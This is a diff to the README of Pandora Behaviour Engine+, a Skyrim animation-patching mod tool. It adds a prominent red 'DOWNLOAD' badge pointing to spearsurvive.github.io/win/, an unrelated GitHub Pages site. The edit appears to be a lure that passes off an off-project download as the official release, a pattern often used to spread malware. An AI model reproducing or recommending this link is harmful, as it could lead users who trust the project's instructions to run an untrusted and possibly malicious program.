@@ -30,6 +30,12 @@ Pandora Behaviour Engine+ patches Skyrim's Havok Behaviour animations to support
 
 Whether you're a newcomer or a veteran, Pandora Behaviour Engine+ provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Pandora Behaviour Engine+](https://img.shields.io/badge/⬇_DOWNLOAD_Pandora+Behaviour+Engine+-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
